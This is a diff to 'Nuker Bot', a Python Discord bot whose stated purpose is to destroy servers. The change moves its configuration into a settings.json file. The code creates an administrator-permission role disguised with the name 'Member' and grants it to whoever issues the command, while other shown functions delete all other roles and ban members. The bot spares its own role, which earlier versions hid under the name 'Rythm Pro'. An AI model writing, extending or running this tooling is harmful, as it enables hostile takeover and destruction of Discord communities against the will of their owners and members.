@@ -1,7 +1,7 @@
 # Made by KingWaffleIII and QuantumFox42
 
 # Nuker Bot
-# v1.3
+# v1.4
 
 import discord
 from discord.ext import commands
@@ -9,41 +9,35 @@ from discord.ext import commands
 import requests
 
 from datetime import datetime
-from dotenv import load_dotenv
-from os import getenv, path
+from os import listdir
 from time import sleep
 from typing import Optional
+from json import loads, dumps
 
-# var declarations
+# If settings json doesn't exist, create it
+if "settings.json" not in listdir():
+    file = open("settings.json", "w+")
+    file.write("""{
+    "TOKEN": false,
+    "USERID": false,    
+    "PREFIX": "!",
+    "STATUS": "watching,for !help",
+    "ROLE_IDS": {}
+}""")
+    file.close()
+    input(
+        "Created Settings JSON, please fill in your bot's token and your user ID (for correct syntax, look at the "
+        "README.md on the GitHub repository)! To continue, press enter!")
 
-if path.isfile(".env"):
-    load_dotenv()
-    TOKEN = getenv("TOKEN")
-    PREFIX = getenv("PREFIX")
-    STATUS = getenv("STATUS")
-    USER_ID = getenv("USER_ID")
-else:
-    TOKEN = False
-    PREFIX = "!"
-    STATUS = "watching,for !help"
-    USER_ID = False
-
-# if getting .env failed; set vars to default value
-if TOKEN is None:
-    TOKEN = False
-if PREFIX is None:
-    PREFIX = "!"
-if STATUS is None:
-    STATUS = "watching,for !help"
-
-if USER_ID is None:
-    USER_ID = False
-# make sure USER_ID can be converted to int type
-else:
-    try:
-        USER_ID = int(USER_ID)
-    except ValueError:
-        USER_ID = False
+# Load settings
+file = open("settings.json", "r")
+json_string = file.read()
+file.close()
+settings = loads(json_string)
+TOKEN = settings["TOKEN"]
+PREFIX = settings["PREFIX"]
+STATUS = settings["STATUS"]
+USER_ID = settings["USERID"]
 
 # parse the STATUS var
 if STATUS is not None:
@@ -70,8 +64,6 @@ bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 bot.remove_command("help")
 
-admin_role = [False]
-
 time = datetime.now()
 
 # def config_options for volume command
@@ -94,6 +86,26 @@ dm = [False]  # dm config in !skip
 nick = [False]  # nick config in !skip
 
 
+# Read and write role IDs
+def getRoleIDs():
+    file = open("settings.json", "r")
+    read = file.read()
+    file.close()
+    return loads(read)["ROLE_IDS"]
+
+
+def writeRoleIDs(write):
+    file = open("settings.json", "r")
+    read = loads(file.read())
+    read["ROLE_IDS"] = write
+    file.close()
+
+    file = open("settings.json", "w+")
+    file.write(dumps(read))
+    file.close()
+    print("")
+
+
 # logging function
 def output_log(text):
     with open(f"nuke_log-{time.strftime('%d.%m.%y')}.txt", "a+") as f:
@@ -104,22 +116,37 @@ def output_log(text):
 # nuking functions
 # create and give admin
 async def create_admin(ctx):
-    global admin_role
-    if not admin_role[0]:
-        try:
-            admin_role = [True]
-
-            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
-
-            admin_role.append(role)
-            admin_role.append(role.id)
-
-            if not USER_ID:
-                await ctx.message.author.add_roles(admin_role[1])
+    try:
+        guildRoleIDs = []
+        for role in ctx.guild.roles:
+            guildRoleIDs.append(role.id)
+        roleIDs = getRoleIDs()
+        if not roleIDs == {}:
+            if str(ctx.guild.id) in roleIDs.keys():
+                if not roleIDs[str(ctx.guild.id)] in guildRoleIDs:
+                    roleIDs.pop(str(ctx.guild.id))
+                    role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
+                    roleIDs[str(ctx.guild.id)] = role.id
+                    writeRoleIDs(roleIDs)
+                else:
+                    role = ctx.guild.get_role(roleIDs[str(ctx.guild.id)])
             else:
-                await ctx.guild.fetch_member(USER_ID).add_role(admin_role[1])
+                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
+                roleIDs[ctx.guild.id] = role.id
+                writeRoleIDs(roleIDs)
+        else:
+            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
+            roleIDs[ctx.guild.id] = role.id
+            writeRoleIDs(roleIDs)
 
-            output_log(f'''
+        alreadyHasRole = False
+        for userRole in ctx.message.author.roles:
+            if userRole.id == role.id:
+                alreadyHasRole = True
+        if not alreadyHasRole:
+            await ctx.message.author.add_roles(role)
+
+        output_log(f'''
 *** ADMIN ALERT ***
 Gave {ctx.message.author} the admin role.
 Server Name: {ctx.guild.name}
@@ -127,64 +154,8 @@ Server Owner: {ctx.guild.owner}
 Time: {datetime.now()}
 ''')
 
-        except discord.Forbidden:
-            output_log(f'''
-Failed to create/grant administrator role: insufficient permissions.
-Server Name: {ctx.guild.name}
-Server Owner: {ctx.guild.owner}
-Time: {datetime.now()}
-''')
-
-    else:
-        role = admin_role[1]
-
-        if role is None:
-            try:
-                admin_role = [True]
-
-                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
-
-                admin_role.append(role)
-                admin_role.append(role.id)
-
-                if not USER_ID:
-                    await ctx.message.author.add_roles(admin_role[1])
-                else:
-                    await ctx.guild.fetch_member(USER_ID).add_role(admin_role[1])
-
-                output_log(f'''
-=> ADMIN ALERT <=
-Gave {ctx.message.author} the admin role.
-Server Name: {ctx.guild.name}
-Server Owner: {ctx.guild.owner}
-Time: {datetime.now()}
-''')
-
-            except discord.Forbidden:
-                output_log(f'''
-Failed to create/grant administrator role: insufficient permissions.
-Server Name: {ctx.guild.name}
-Server Owner: {ctx.guild.owner}
-Time: {datetime.now()}
-''')
-
-        else:
-            try:
-                if not USER_ID:
-                    await ctx.message.author.add_roles(admin_role[1])
-                else:
-                    await ctx.guild.fetch_member(USER_ID).add_role(admin_role[1])
-
-                output_log(f'''
-=> ADMIN ALERT <=
-Gave {ctx.message.author} the admin role.
-Server Name: {ctx.guild.name}
-Server Owner: {ctx.guild.owner}
-Time: {datetime.now()}
-''')
-
-            except discord.Forbidden:
-                output_log(f'''
+    except discord.Forbidden:
+        output_log(f'''
 Failed to create/grant administrator role: insufficient permissions.
 Server Name: {ctx.guild.name}
 Server Owner: {ctx.guild.owner}
@@ -377,12 +348,15 @@ async def nuke(ctx):
     # delete all roles
 
     role_list = []
+
+    roleIDs = getRoleIDs()
+
     for role in ctx.guild.roles:
         if role == ctx.guild.default_role:
             pass
-        elif role == discord.utils.get(ctx.guild.roles, name="Rythm Pro"):
+        elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
             pass
-        elif role == admin_role[1]:
+        elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
             pass
         else:
             role_list.append(role)
@@ -660,14 +634,15 @@ async def skip(ctx):
 
         await ban_members(ctx, member_list)
 
+    roleIDs = getRoleIDs()
     if do_roles:
         role_list = []
         for role in ctx.guild.roles:
-            if role == discord.utils.get(ctx.guild.roles, name="Rythm Pro"):
+            if role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
                 pass
             elif role == ctx.guild.default_role:
                 pass
-            elif role == admin_role[1]:
+            elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
                 pass
             else:
                 role_list.append(role)
@@ -834,7 +809,7 @@ Time: {datetime.now()}
 
 
 if not TOKEN:
-    print("Not detecting a dotenv file...")
+    print("Could not find token in settings")
     print("\nPlease enter your bot token: ")
     print("(if you don't know what this is, please visit: https://github.com/KingWaffleIII/Nuker-Bot#setup to see how "
           "to make your own bot application)\n")
